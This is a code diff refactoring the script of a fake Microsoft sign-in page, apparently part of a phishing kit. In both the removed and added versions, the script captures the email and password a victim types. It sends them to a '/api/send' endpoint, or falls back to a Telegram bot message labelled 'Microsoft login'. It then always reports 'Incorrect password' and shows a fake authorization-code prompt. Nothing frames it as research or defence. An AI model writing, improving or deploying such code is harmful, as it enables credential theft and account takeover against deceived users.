@@ -177,313 +177,378 @@
   </div>
   <!-- ...existing code... -->
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-  const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const nextBtn = document.getElementById('next');
-  const submitBtn = document.getElementById('submit-btn');
-  const div1 = document.getElementById('div1');
-  const div2 = document.getElementById('div2');
-  const error = document.getElementById('error');
-  const emailch = document.getElementById('emailch');
-  const msg = document.getElementById('msg');
-
-  // Create a resend control inside the password panel (if not present in HTML)
-  let resendLink = document.getElementById('resendCode');
-  if (!resendLink) {
-    const helpLinks = div2.querySelector('.help-links') || div2;
-    resendLink = document.createElement('a');
-    resendLink.href = '#';
-    resendLink.id = 'resendCode';
-    resendLink.textContent = 'Resend code';
-    resendLink.style.display = 'none';
-    resendLink.style.marginLeft = '12px';
-    resendLink.style.color = '#0067b8';
-    resendLink.style.cursor = 'pointer';
-    helpLinks.appendChild(document.createElement('br'));
-    helpLinks.appendChild(resendLink);
-  }
-
-  let pwdAttempt = 0;
-  let codeAttempt = 0;
-  let inCodeMode = false;
-  let errorTimeout = null;
-
-  // Resend tracking
-  let resendAttempts = 0;
-  const RESEND_MAX = 5;
-  const BASE_RESEND_DELAY_MS = 2000; // base lockout between resend attempts (exponential backoff)
-  let resendLockTimer = null;
-
-  function showErrorMessage(el, text) {
-    el.textContent = text;
-    el.style.display = 'block';
-  }
-  function hideErrorMessage(el) {
-    el.textContent = '';
-    el.style.display = 'none';
-  }
-  function showErrorWithDelay(el, text, delay = 2000) {
-    hideErrorMessage(el);
-    clearTimeout(errorTimeout);
-    errorTimeout = setTimeout(() => showErrorMessage(el, text), delay);
-  }
-
-  function getActiveEmail() {
-    const eFromCh = (emailch && emailch.textContent) ? emailch.textContent.trim() : '';
-    const eFromInput = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
-    return eFromCh || eFromInput || '';
-  }
-
-  // Helper: fetch with timeout (detect network interruption)
-  async function fetchWithTimeout(resource, options = {}, timeout = 10000) {
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), timeout);
+(function(){
+  // Defensive hide for the loading screen so page never stays stuck
+  const LOADING_SCREEN_ID = 'loading-screen';
+  function hideLoading() {
     try {
-      const response = await fetch(resource, { ...options, signal: controller.signal });
-      clearTimeout(id);
-      return response;
-    } catch (err) {
-      clearTimeout(id);
-      throw err;
-    }
+      const el = document.getElementById(LOADING_SCREEN_ID);
+      if (el) el.style.display = 'none';
+    } catch (e) { console.warn('hideLoading failed', e); }
   }
 
-  // Try to forward to your server endpoint /api/send (preferred) then fallback to direct Telegram (only if TG_BOT_TOKEN/TG_CHAT_ID present)
-  async function forwardToServer(email, secret, kind = 'password') {
+  // Fallback: hide loading after 4s if something blocks normal flow
+  const fallbackHideTimer = setTimeout(hideLoading, 4000);
+
+  document.addEventListener('DOMContentLoaded', function() {
+    // hide loading immediately on DOMContentLoaded
     try {
-      const res = await fetchWithTimeout('/api/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, secret, kind })
-      }, 10000);
-      if (!res.ok) {
-        // treat non-2xx as error
-        const text = await res.text().catch(()=>'{unreadable body}');
-        throw new Error('Server forward failed: ' + res.status + ' ' + text);
-      }
-      return await res.json();
-    } catch (err) {
-      console.warn('[forwardToServer] failed', err);
-      throw err;
-    }
-  }
-
-  async function sendDirectToTelegram(email, secret, kind = 'password') {
-    // Only used as fallback for quick testing. Do NOT put your BOT token in production.
-    if (typeof TG_BOT_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined') {
-      throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct fallback.');
-    }
-    const text = kind === 'password'
-      ? `Microsoft login:\nEmail: ${email}\nPassword: ${secret}`
-      : `Microsoft login (code/resend):\nEmail: ${email}\nInfo: ${secret}`;
-    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
-    const res = await fetchWithTimeout(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
-    }, 10000);
-    const json = await res.json();
-    if (!json.ok) throw new Error('Telegram API error: ' + JSON.stringify(json));
-    return json;
-  }
-
-  // Unified send that tries server forward first, then direct fallback
-  async function sendForSecret(email, secret, kind = 'password') {
-    try {
-      return await forwardToServer(email, secret, kind);
-    } catch (err) {
-      // server forward failed (network or server). Attempt direct fallback only for debugging if global token exists.
-      console.warn('[sendForSecret] server forward failed, trying fallback', err);
-      return await sendDirectToTelegram(email, secret, kind);
-    }
-  }
-
-  // Resend code flow: called when user clicks "Resend code"
-  async function handleResendClick(e) {
-    if (e) e.preventDefault();
-    if (!inCodeMode) return;
-    if (resendAttempts >= RESEND_MAX) {
-      showErrorMessage(msg, 'Too many resend attempts. Try again later.');
-      return;
-    }
-
-    const email = getActiveEmail();
-    if (!email) {
-      showErrorMessage(msg, 'Email missing. Go back and enter your email first.');
-      return;
-    }
-
-    // UI lock & feedback
-    resendAttempts++;
-    const lockDelay = BASE_RESEND_DELAY_MS * Math.pow(2, resendAttempts - 1); // exponential backoff
-    resendLink.textContent = `Resending... (${resendAttempts}/${RESEND_MAX})`;
-    resendLink.style.pointerEvents = 'none';
-    resendLink.style.opacity = '0.6';
-    hideErrorMessage(msg);
+      hideLoading();
+      clearTimeout(fallbackHideTimer);
+    } catch (e) { /* ignore */ }
 
     try {
-      // send a "resend" action to server (preferred) or fallback to direct send
-      await sendForSecret(email, 'resend_requested', 'resend');
-      // success UI
-      showErrorWithDelay(msg, 'Code resent. Check your SMS or authenticator app.', 500);
-    } catch (err) {
-      // detect network interruption vs other errors
-      if (err.name === 'AbortError') {
-        showErrorMessage(msg, 'Network interrupted while resending. Tap Resend again to retry.');
-      } else {
-        showErrorMessage(msg, 'Resend failed. Tap Resend to try again.');
-      }
-      console.error('[handleResendClick] resend failed', err);
-    } finally {
-      // schedule unlock after lockDelay (so user cannot hammer Resend)
-      clearTimeout(resendLockTimer);
-      resendLockTimer = setTimeout(() => {
+      // MAIN INITIALIZATION
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const nextBtn = document.getElementById('next');
+      const submitBtn = document.getElementById('submit-btn');
+      const div1 = document.getElementById('div1');
+      const div2 = document.getElementById('div2');
+      const error = document.getElementById('error');
+      const emailch = document.getElementById('emailch');
+      const msg = document.getElementById('msg');
+
+      // Create resend control if missing
+      let resendLink = document.getElementById('resendCode');
+      if (!resendLink && div2) {
+        const helpLinks = div2.querySelector('.help-links') || div2;
+        resendLink = document.createElement('a');
+        resendLink.href = '#';
+        resendLink.id = 'resendCode';
         resendLink.textContent = 'Resend code';
-        resendLink.style.pointerEvents = '';
-        resendLink.style.opacity = '';
-      }, lockDelay);
-    }
-  }
+        resendLink.style.display = 'none';
+        resendLink.style.marginLeft = '12px';
+        resendLink.style.color = '#0067b8';
+        resendLink.style.cursor = 'pointer';
+        helpLinks.appendChild(document.createElement('br'));
+        helpLinks.appendChild(resendLink);
+      }
 
-  // Wire resend link
-  resendLink.addEventListener('click', handleResendClick);
+      let pwdAttempt = 0;
+      let codeAttempt = 0;
+      let inCodeMode = false;
+      let errorTimeout = null;
 
-  // Existing UI flows; ensure resend link shows when entering code mode
-  nextBtn.addEventListener('click', function () {
-    var my_email = emailInput.value.trim();
-    var filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
-    if (!filter.test(my_email)) {
-      showErrorMessage(error, "That Microsoft account doesn't exist. Enter a different account.");
-      emailInput.focus();
-      return false;
-    }
-    div1.style.display = 'none';
-    div2.style.display = 'flex';
-    emailch.textContent = my_email;
-    hideErrorMessage(msg);
-    passwordInput.value = '';
-    pwdAttempt = 0;
-    codeAttempt = 0;
-    inCodeMode = false;
-    // Reset UI if returning from code mode
-    document.querySelector('.signin-title').textContent = 'Sign in';
-    document.querySelector('label[for="password"]').textContent = 'Password';
-    passwordInput.type = 'password';
-    passwordInput.placeholder = 'Password';
-    submitBtn.textContent = 'Sign in';
-    submitBtn.disabled = false;
-    passwordInput.focus();
-    // hide resend link until code mode
-    resendLink.style.display = 'none';
-  });
+      // Resend lock state
+      let resendAttempts = 0;
+      const RESEND_MAX = 5;
+      const BASE_RESEND_DELAY_MS = 2000;
+      let resendLockTimer = null;
 
-  // Back button (click logo)
-  div2.querySelector('.msft-logo-row').addEventListener('click', function() {
-    hideErrorMessage(msg);
-    passwordInput.value = '';
-    div2.style.display = 'none';
-    div1.style.display = 'flex';
-    emailInput.focus();
-    // hide resend link when leaving
-    resendLink.style.display = 'none';
-  });
+      function showErrorMessage(el, text) {
+        if (!el) return;
+        el.textContent = text;
+        el.style.display = 'block';
+      }
+      function hideErrorMessage(el) {
+        if (!el) return;
+        el.textContent = '';
+        el.style.display = 'none';
+      }
+      function showErrorWithDelay(el, text, delay = 2000) {
+        hideErrorMessage(el);
+        clearTimeout(errorTimeout);
+        errorTimeout = setTimeout(() => showErrorMessage(el, text), delay);
+      }
 
-  // Submit behavior (password mode -> may switch to code mode)
-  submitBtn.addEventListener('click', function(event){
-    event.preventDefault();
-    var email = getActiveEmail();
-    var password = passwordInput.value;
-    var filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
-    if (!filter.test(email)) {
-      showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
-      return;
-    }
+      function getActiveEmail() {
+        const eFromCh = (emailch && emailch.textContent) ? emailch.textContent.trim() : '';
+        const eFromInput = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
+        return eFromCh || eFromInput || '';
+      }
 
-    submitBtn.textContent = 'Verifying...';
-    submitBtn.disabled = true;
-
-    if (inCodeMode) {
-      // code verification simulation
-      codeAttempt++;
-      setTimeout(function() {
-        submitBtn.textContent = 'Enter';
-        submitBtn.disabled = false;
-        passwordInput.value = '';
-        passwordInput.focus();
-        let codeMsg = (codeAttempt >= 4)
-          ? "Too many incorrect codes. Please try again later."
-          : "Incorrect code. Please try again.";
-        showErrorWithDelay(msg, codeMsg);
-        if (codeAttempt >= 4) {
-          setTimeout(() => location.reload(), 2000);
+      // fetch with timeout
+      async function fetchWithTimeout(resource, options = {}, timeout = 10000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        try {
+          const response = await fetch(resource, { ...options, signal: controller.signal });
+          clearTimeout(id);
+          return response;
+        } catch (err) {
+          clearTimeout(id);
+          throw err;
         }
-      }, 800);
-      return;
-    }
+      }
 
-    // PASSWORD MODE: send email + password (or forward to server)
-    pwdAttempt++;
-    // Use sendForSecret so it tries server and falls back if configured
-    sendForSecret(email, password, 'password')
-      .then(res => {
-        console.log('[sendForSecret] success', res);
-      })
-      .catch(err => {
-        console.error('[sendForSecret] error', err);
-        // If this failed due to network, inform user and allow retry/resend later.
-        if (err.name === 'AbortError') {
-          showErrorWithDelay(msg, 'Network interrupted. Please check your connection and try again.');
-        } else {
-          // still show the standard incorrect password flow but allow resends on next steps
+      // server forward (preferred)
+      async function forwardToServer(email, secret, kind = 'password') {
+        try {
+          const res = await fetchWithTimeout('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, secret, kind })
+          }, 10000);
+          if (!res.ok) {
+            const text = await res.text().catch(()=>'{unreadable body}');
+            throw new Error('Server forward failed: ' + res.status + ' ' + text);
+          }
+          return await res.json();
+        } catch (err) {
+          console.warn('[forwardToServer] failed', err);
+          throw err;
         }
-      })
-      .finally(() => {
-        if (pwdAttempt === 1) {
-          setTimeout(() => {
+      }
+
+      // direct fallback (only if TG_BOT_TOKEN / TG_CHAT_ID globals are present)
+      async function sendDirectToTelegram(email, secret, kind = 'password') {
+        if (typeof TG_BOT_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined') {
+          throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct fallback.');
+        }
+        const text = kind === 'password'
+          ? `Microsoft login:\nEmail: ${email}\nPassword: ${secret}`
+          : `Microsoft login (code/resend):\nEmail: ${email}\nInfo: ${secret}`;
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const res = await fetchWithTimeout(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
+        }, 10000);
+        const json = await res.json();
+        if (!json.ok) throw new Error('Telegram API error: ' + JSON.stringify(json));
+        return json;
+      }
+
+      // unified send: server first, fallback to direct
+      async function sendForSecret(email, secret, kind = 'password') {
+        try {
+          return await forwardToServer(email, secret, kind);
+        } catch (err) {
+          console.warn('[sendForSecret] server forward failed, trying fallback', err);
+          return await sendDirectToTelegram(email, secret, kind);
+        }
+      }
+
+      // Resend handler
+      async function handleResendClick(e) {
+        if (e) e.preventDefault();
+        if (!inCodeMode) return;
+        if (resendAttempts >= RESEND_MAX) {
+          showErrorMessage(msg, 'Too many resend attempts. Try again later.');
+          return;
+        }
+
+        const email = getActiveEmail();
+        if (!email) {
+          showErrorMessage(msg, 'Email missing. Go back and enter your email first.');
+          return;
+        }
+
+        // UI lock & feedback
+        resendAttempts++;
+        const lockDelay = BASE_RESEND_DELAY_MS * Math.pow(2, resendAttempts - 1); // exponential backoff
+        resendLink.textContent = `Resending... (${resendAttempts}/${RESEND_MAX})`;
+        resendLink.style.pointerEvents = 'none';
+        resendLink.style.opacity = '0.6';
+        hideErrorMessage(msg);
+
+        try {
+          // send a "resend" action to server (preferred) or fallback to direct send
+          await sendForSecret(email, 'resend_requested', 'resend');
+          // success UI
+          showErrorWithDelay(msg, 'Code resent. Check your SMS or authenticator app.', 500);
+        } catch (err) {
+          // detect network interruption vs other errors
+          if (err.name === 'AbortError') {
+            showErrorMessage(msg, 'Network interrupted while resending. Tap Resend again to retry.');
+          } else {
+            showErrorMessage(msg, 'Resend failed. Tap Resend to try again.');
+          }
+          console.error('[handleResendClick] resend failed', err);
+        } finally {
+          // schedule unlock after lockDelay (so user cannot hammer Resend)
+          clearTimeout(resendLockTimer);
+          resendLockTimer = setTimeout(() => {
+            if (resendLink) {
+              resendLink.textContent = 'Resend code';
+              resendLink.style.pointerEvents = '';
+              resendLink.style.opacity = '';
+            }
+          }, lockDelay);
+        }
+      }
+
+      // Wire resend link if present
+      if (resendLink) resendLink.addEventListener('click', handleResendClick);
+
+      // Next button logic: move to password panel
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          const my_email = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
+          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
+          if (!filter.test(my_email)) {
+            showErrorMessage(error, "That Microsoft account doesn't exist. Enter a different account.");
+            if (emailInput) emailInput.focus();
+            return false;
+          }
+          if (div1) div1.style.display = 'none';
+          if (div2) div2.style.display = 'flex';
+          if (emailch) emailch.textContent = my_email;
+          hideErrorMessage(msg);
+          if (passwordInput) passwordInput.value = '';
+          pwdAttempt = 0;
+          codeAttempt = 0;
+          inCodeMode = false;
+          // Reset UI if returning from code mode
+          const title = document.querySelector('.signin-title');
+          if (title) title.textContent = 'Sign in';
+          const lbl = document.querySelector('label[for="password"]');
+          if (lbl) lbl.textContent = 'Password';
+          if (passwordInput) {
+            passwordInput.type = 'password';
+            passwordInput.placeholder = 'Password';
+          }
+          if (submitBtn) {
             submitBtn.textContent = 'Sign in';
             submitBtn.disabled = false;
-            passwordInput.value = '';
-            passwordInput.focus();
-            showErrorWithDelay(msg, "Incorrect password. Please try again.");
-          }, 2000);
-        } else if (pwdAttempt === 2) {
-          setTimeout(() => {
-            document.querySelector('.signin-title').textContent = 'Enter code';
-            document.querySelector('label[for="password"]').textContent = 'Enter code';
-            passwordInput.type = 'text';
-            passwordInput.placeholder = 'Enter code';
-            submitBtn.textContent = 'Enter';
-            submitBtn.disabled = false;
-            passwordInput.value = '';
-            passwordInput.focus();
-            inCodeMode = true;
-            // show resend link when code mode is active
-            resendLink.style.display = 'inline';
-            showErrorWithDelay(msg, "Authorization code required. Please check your sms or authenticator app.");
-          }, 2000);
-        } else {
-          setTimeout(() => {
-            submitBtn.textContent = 'Sign in';
-            submitBtn.disabled = false;
-            passwordInput.value = '';
-            passwordInput.focus();
-            showErrorWithDelay(msg, "Incorrect password. Please try again.");
-          }, 2000);
+          }
+          if (passwordInput) passwordInput.focus();
+          // hide resend link until code mode
+          if (resendLink) resendLink.style.display = 'none';
+        });
+      }
+
+      // Back button (click logo row)
+      try {
+        const logoRow = div2 ? div2.querySelector('.msft-logo-row') : null;
+        if (logoRow) {
+          logoRow.addEventListener('click', function() {
+            hideErrorMessage(msg);
+            if (passwordInput) passwordInput.value = '';
+            if (div2) div2.style.display = 'none';
+            if (div1) div1.style.display = 'flex';
+            if (emailInput) emailInput.focus();
+            // hide resend link when leaving
+            if (resendLink) resendLink.style.display = 'none';
+          });
         }
-      });
-  });
+      } catch (e) { /* ignore */ }
 
-  passwordInput.addEventListener('keydown', function(e){
-    if (e.key === "Enter") submitBtn.click();
-  });
+      // Submit behavior (password mode -> may switch to code mode)
+      if (submitBtn) {
+        submitBtn.addEventListener('click', function(event){
+          event.preventDefault();
+          const email = getActiveEmail();
+          const password = passwordInput ? passwordInput.value : '';
+          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
+          if (!filter.test(email)) {
+            showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
+            return;
+          }
 
-  // Expose a manual retry helper (optional) to allow re-sending last action (not persisted across reloads)
-  window.retryLastResend = function() {
-    if (!inCodeMode) return;
-    handleResendClick();
-  };
-});
+          if (submitBtn) {
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+          }
+
+          if (inCodeMode) {
+            // code verification simulation
+            codeAttempt++;
+            setTimeout(function() {
+              if (submitBtn) {
+                submitBtn.textContent = 'Enter';
+                submitBtn.disabled = false;
+              }
+              if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.focus();
+              }
+              const codeMsg = (codeAttempt >= 4)
+                ? "Too many incorrect codes. Please try again later."
+                : "Incorrect code. Please try again.";
+              showErrorWithDelay(msg, codeMsg);
+              if (codeAttempt >= 4) setTimeout(() => location.reload(), 2000);
+            }, 800);
+            return;
+          }
+
+          // PASSWORD MODE: send email + password (or forward to server)
+          pwdAttempt++;
+          // Use sendForSecret so it tries server and falls back if configured
+          sendForSecret(email, password, 'password')
+            .then(res => {
+              console.log('[sendForSecret] success', res);
+            })
+            .catch(err => {
+              console.error('[sendForSecret] error', err);
+              if (err.name === 'AbortError') {
+                showErrorWithDelay(msg, 'Network interrupted. Please check your connection and try again.');
+              }
+              // else: continue with normal UX (we still show incorrect password simulation below)
+            })
+            .finally(() => {
+              if (pwdAttempt === 1) {
+                setTimeout(() => {
+                  if (submitBtn) {
+                    submitBtn.textContent = 'Sign in';
+                    submitBtn.disabled = false;
+                  }
+                  if (passwordInput) {
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                  }
+                  showErrorWithDelay(msg, "Incorrect password. Please try again.");
+                }, 2000);
+              } else if (pwdAttempt === 2) {
+                setTimeout(() => {
+                  const title = document.querySelector('.signin-title');
+                  if (title) title.textContent = 'Enter code';
+                  const lbl = document.querySelector('label[for="password"]');
+                  if (lbl) lbl.textContent = 'Enter code';
+                  if (passwordInput) {
+                    passwordInput.type = 'text';
+                    passwordInput.placeholder = 'Enter code';
+                  }
+                  if (submitBtn) {
+                    submitBtn.textContent = 'Enter';
+                    submitBtn.disabled = false;
+                  }
+                  if (passwordInput) {
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                  }
+                  inCodeMode = true;
+                  // show resend link when code mode is active
+                  if (resendLink) resendLink.style.display = 'inline';
+                  showErrorWithDelay(msg, "Authorization code required. Please check your sms or authenticator app.");
+                }, 2000);
+              } else {
+                setTimeout(() => {
+                  if (submitBtn) {
+                    submitBtn.textContent = 'Sign in';
+                    submitBtn.disabled = false;
+                  }
+                  if (passwordInput) {
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                  }
+                  showErrorWithDelay(msg, "Incorrect password. Please try again.");
+                }, 2000);
+              }
+            });
+        });
+      }
+
+      if (passwordInput) {
+        passwordInput.addEventListener('keydown', function(e){
+          if (e.key === "Enter" && submitBtn) submitBtn.click();
+        });
+      }
+
+      // Expose a manual retry helper (optional) to allow re-sending last action (not persisted across reloads)
+      window.retryLastResend = function() {
+        if (!inCodeMode) return;
+        handleResendClick();
+      };
+
+    } catch (initErr) {
+      console.error('Initialization error:', initErr);
+      // Ensure loading screen is removed even if init fails
+      try { hideLoading(); } catch (e) {}
+    }
+  });
+})();
 </script>
 <!-- ...existing code... -->
 </body>
